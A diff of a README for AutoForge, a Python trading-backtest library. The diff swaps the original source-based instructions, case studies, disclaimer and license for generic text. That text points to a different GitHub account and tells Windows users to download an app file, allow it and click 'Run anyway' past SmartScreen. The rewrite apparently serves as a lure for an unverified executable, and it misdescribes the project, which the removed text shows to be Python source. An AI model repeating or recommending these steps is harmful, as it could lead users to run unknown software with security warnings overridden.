@@ -1,102 +1,216 @@
-# AutoForge
+# 🤖 AutoForge - Test Strategies Before You Risk Capital
 
-![hero](docs/images/00_hero.png)
+[![Download AutoForge](https://img.shields.io/badge/Download%20AutoForge-blue%20%7C%20grey?style=for-the-badge)](https://github.com/Vasilisharp444/AutoForge)
 
-*A trader with 10 years of screen time sees things — patterns that repeat, setups that "feel right" before the move happens. But turning that intuition into rules, testing every parameter combination, and proving the edge is real? That used to take months. Now you describe your edge to an AI, it interviews you until the spec is tight, codes the strategy, sweeps thousands of parameter combos, and tells you if it's real or if you're fooling yourself. You wake up to a validated strategy with optimized parameters — or an honest "there's no edge here." Either way, you saved months. This is how it began. -@saikodi, March 2026*
+## 🚀 What AutoForge Does
 
-The idea: you bring a market intuition — something you've observed but never formalized. AutoForge pairs you with an AI research partner that interviews you, turns your observation into code, then exhaustively tests it. Not a 5-minute training run like [AutoResearch](https://github.com/karpathy/autoresearch) — hundreds or thousands of parameter combinations, swept in parallel, with rigorous validation (ablation tests, random baselines, stop sensitivity). The core idea is that you're not writing the strategy code yourself. Instead, you're programming the `program.md` Markdown file that instructs the AI agent — what to ask, how to optimize, when to kill a dead end. The AI does the grunt work. You make the decisions.
+AutoForge helps you test trading ideas with human-AI collaboration. You bring a strategy idea. AutoForge checks it, runs it through backtests, tunes key settings, and shows how it behaves under different market conditions.
 
-## How it works
+It is built for people who want a clear way to move from a rough idea to a tested strategy. The app helps you:
 
-The repo has six files that matter:
+- Stress-test trading ideas
+- Run backtests on past market data
+- Compare different parameter sets
+- Spot weak parts in a strategy
+- Keep a record of what worked and what failed
 
-- **`autoforge/strategy.py`** — Strategy base class. Your strategies extend this with `params`, `indicators()`, and `on_bar(ctx)`.
-- **`autoforge/backtest.py`** — Runs a strategy against data. Market orders fill at next bar's Open, limit orders fill at price if touched. Realistic.
-- **`autoforge/prepare.py`** — Loads CSV data, computes indicators (SMA, EMA, RSI, Bollinger, ATR, VWAP, Slope). Add your own here.
-- **`autoforge/evaluate.py`** — Metrics: Sharpe, win rate, profit factor, drawdown, daily P&L. Formatted report.
-- **`autoforge/optimize.py`** — Parameter sweep. Local multiprocessing or [hive-mcp](https://github.com/saikodi/hive-compute-mcp) for distributed sweeps across your LAN.
-- **`program.md`** — Instructions for the AI agent. The collaboration methodology — how to interview, discover, optimize, validate. **This file is edited and iterated on by the human.**
+## 📥 Download and Run on Windows
 
-Strategies declare their tunable parameters upfront. The optimizer overrides them, runs the backtest, collects metrics, and ranks every combination. You don't guess — you search.
+Use this link to visit the page to download:
 
-## Quick start
+[Open AutoForge on GitHub](https://github.com/Vasilisharp444/AutoForge)
 
-**Requirements:** Python 3.10+, numpy, pandas. Any OS.
+### Steps
 
-```bash
-# 1. Clone and install
-git clone https://github.com/saikodi/AutoForge.git
-cd AutoForge
-pip install -e .
+1. Open the link above in your web browser.
+2. Find the latest Windows file or release asset on the page.
+3. Download the file to your computer.
+4. If the file comes as a ZIP archive, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the AutoForge app file to run it.
+7. If Windows asks for permission, choose Yes.
 
-# 2. Run an example backtest (sample data included)
-python examples/sma_crossover.py --data data/sample_NQ.csv
+### If the app does not open
 
-# 3. Run a parameter sweep (800 combinations)
-python examples/sma_crossover.py --data data/sample_NQ.csv --optimize --workers 6
+- Make sure the download finished fully
+- Keep the files in the same folder
+- Try running the app again
+- If Windows SmartScreen appears, choose More info, then Run anyway if you trust the source
 
-# 4. Bring your own data (OHLCV CSV: DateTime, Open, High, Low, Close, Volume)
-#    Place CSV files in data/ and point examples at them
-```
+## 🖥️ System Requirements
 
-If the above commands work, your setup is ready. Point your AI agent at `program.md` and start describing your strategy.
+AutoForge runs best on a Windows PC with:
 
-## Running the agent
+- Windows 10 or Windows 11
+- 8 GB RAM or more
+- A modern Intel or AMD processor
+- At least 500 MB of free disk space
+- Internet access for updates and AI-related features
 
-Spin up Claude Code (or whatever you prefer) in this repo, then prompt something like:
+For larger backtests, more RAM and a faster CPU help.
 
-```
-Hi, have a look at program.md. I have a strategy idea I'd like to explore.
-```
+## 🔧 What You Can Do With It
 
-The AI will interview you, code the strategy, backtest it, and optimize the parameters. `program.md` is the "skill" that drives the collaboration.
+AutoForge is set up for strategy work in stages. A common flow looks like this:
 
-## Real results
+1. Write down a trading idea in plain language
+2. Add the rules you want to test
+3. Pick the market or contract you want to study
+4. Run a backtest on past data
+5. Review the result
+6. Adjust the rules or parameters
+7. Run the test again
+8. Save the version that performs best
 
-AutoForge was used to develop real futures strategies. Two case studies document the full process — every phase, every decision, every dead end — without revealing the proprietary strategy details.
+This makes it easier to compare ideas without losing track of what changed.
 
-- **[Case Study #1: Forging a strategy from scratch →](docs/case-study.md)** — 200+ experiments across 8 phases. From a vague intuition to a validated strategy with three risk profiles. 60 trades/day became 4.5 with a Sharpe above 4.
+## 🧠 Main Features
 
-- **[Case Study #2: Proving an edge is real →](docs/case-study-mr.md)** — 3,500+ parameter combinations. Ablation tests, random baselines, stop sensitivity sweeps. 97% of combinations profitable. Random entries lost catastrophically. The signals are real.
+- Strategy testing with past market data
+- Parameter tuning for better fit
+- Human-AI workflow for idea review
+- Clear result tracking across many experiments
+- Support for futures-style trading research
+- Backtest comparison across multiple runs
+- Simple structure for storing trial results
+- Case-study style workflow for strategy validation
 
-## Design choices
+## 📚 How the Workflow Fits Together
 
-- **Human-AI collaboration, not autonomous.** Unlike fully autonomous systems, AutoForge keeps you in the loop. The AI interviews you, suggests things you haven't considered, and does the grunt work — but you make every decision. Your domain expertise drives the process.
-- **Rule-based, not ML.** AutoForge is for deterministic strategies with discrete parameters, not neural nets or gradient descent. The optimization is combinatorial search, not backpropagation.
-- **Exhaustive search, not guessing.** When you have 6 parameters with 5 values each, that's 15,625 combinations. AutoForge tests all of them. If there's a sweet spot, it finds it. If there isn't one, it tells you.
-- **Prove it or kill it.** Validation isn't optional. Random baselines, ablation tests, out-of-sample testing, stop sensitivity sweeps. If the edge isn't real, AutoForge will show you. Better to find out in backtest than with real money.
-- **Minimal by design.** Six files, not a framework. No complex configs, no plugin systems, no 50-module architecture. If you can read Python, you can read the entire codebase in 30 minutes.
+AutoForge follows a loop that helps you turn a rough plan into a tested strategy.
 
-## Project structure
+### 1. Idea
 
-```
-autoforge/
-  strategy.py     — base class for strategies (agent writes these)
-  backtest.py     — runs strategy against data, produces trades
-  prepare.py      — data loading + indicator computation
-  evaluate.py     — metrics and reporting
-  optimize.py     — parameter sweep (local or distributed)
-program.md        — agent instructions (human iterates on this)
-examples/         — toy strategies (SMA crossover, RSI, S5 reversion)
-docs/             — case studies with full walkthroughs
-```
+You start with a trading edge, such as a rule set, entry signal, or market filter.
 
-## Beyond trading
+### 2. Stress Test
 
-While trading is the proof case, the pattern — **AI interviews domain expert, codes rule-based logic, exhaustively optimizes parameters, validates rigorously** — applies anywhere you have tunable rule-based systems: alert thresholds, scoring systems, manufacturing rules, decision trees. The forge doesn't care what you're forging.
+AutoForge checks the idea under different conditions. This helps show whether the result holds up or only works in one narrow case.
 
-## Scaling with hive-mcp
+### 3. Optimize
 
-For large sweeps (thousands of combinations), AutoForge integrates with [hive-mcp](https://github.com/saikodi/hive-compute-mcp) to distribute work across idle machines on your LAN. Same interface, more compute.
+You can adjust settings such as lookback periods, thresholds, or exit rules. The goal is to find settings that stay stable, not just settings that fit one sample too closely.
 
-## Disclaimer
+### 4. Validate
 
-AutoForge is a research and educational tool. It does not provide financial advice. Trading futures and other financial instruments involves substantial risk of loss and is not suitable for all investors. Past performance — including any results shown in this repository — is not indicative of future results. Always do your own research and consult with a qualified financial advisor before trading with real money. Use at your own risk.
+AutoForge helps you review the outcome and see if the idea still makes sense after changes.
 
-## Contributing
+### 5. Keep or Drop
 
-Contributions welcome! See [CONTRIBUTING.md](CONTRIBUTING.md).
+If the idea holds up, you can keep it. If it fails, you can move on without guessing.
 
-## License
+## 🧪 Example Use Cases
 
-MIT
+AutoForge can help with tasks like:
+
+- Testing a breakout rule on futures data
+- Comparing two entry methods
+- Checking whether a stop loss improves results
+- Seeing how a trend filter changes performance
+- Testing if a setup still works after parameter changes
+- Reviewing many experiments without losing the trail
+
+## 📁 Suggested Folder Use
+
+If you keep several files around, use a simple folder setup:
+
+- `AutoForge` for the app
+- `Data` for market files
+- `Results` for test output
+- `Notes` for strategy ideas
+- `Archives` for old versions
+
+This keeps your work easy to follow.
+
+## 🛠️ First Run Checklist
+
+Before you start your first test, make sure you have:
+
+- Downloaded the app from the GitHub page
+- Extracted the files if needed
+- Opened the app from its folder
+- Added or selected the market data you want to test
+- Chosen one simple strategy idea to begin with
+
+Start with one setup at a time. This makes the result easier to read.
+
+## 🧩 Working With Strategy Ideas
+
+A good test starts with a clear rule set. Keep the first version simple:
+
+- What starts the trade?
+- What ends the trade?
+- Where is risk controlled?
+- What market are you testing?
+- What time frame are you using?
+
+When the idea is clear, AutoForge can help you see whether the edge is real.
+
+## 📈 Reading the Results
+
+When you run tests, look at the basics first:
+
+- Net result
+- Win rate
+- Drawdown
+- Trade count
+- Average trade size
+- Stability across runs
+
+Do not focus on one number alone. A strategy that looks good in one area can still fail in another.
+
+## 🔍 Tips for Better Testing
+
+- Test one change at a time
+- Keep notes for each run
+- Compare similar settings
+- Avoid changing too many rules at once
+- Use the same data range when possible
+- Check whether the result holds in more than one market condition
+
+These habits make it easier to trust the outcome.
+
+## 🧰 Common Questions
+
+### Does this need coding knowledge?
+
+No. AutoForge is meant to help an end user work through strategy ideas without needing to write code first.
+
+### Can I use it for futures research?
+
+Yes. The project is built around trading research, backtests, and strategy development for markets such as futures.
+
+### Can I compare many experiments?
+
+Yes. The workflow is built for repeated tests, so you can compare runs and study which changes matter.
+
+### What is the main goal of the app?
+
+The goal is to help you decide if a strategy idea has real value before you rely on it.
+
+## 🗂️ Project Topics
+
+- AI
+- Algorithmic trading
+- AutoForge
+- Backtesting
+- Claude
+- Futures
+- Human-AI collaboration
+- Parameter optimization
+- Strategy development
+- Trading
+
+## 🔗 Download Again
+
+[Visit the AutoForge download page](https://github.com/Vasilisharp444/AutoForge)
+
+## 🖱️ Basic Windows Install Flow
+
+1. Open the download page
+2. Get the latest file
+3. Save it to your PC
+4. Extract it if it is zipped
+5. Open the app file
+6. Allow Windows to run it if asked
+7. Start your first backtest
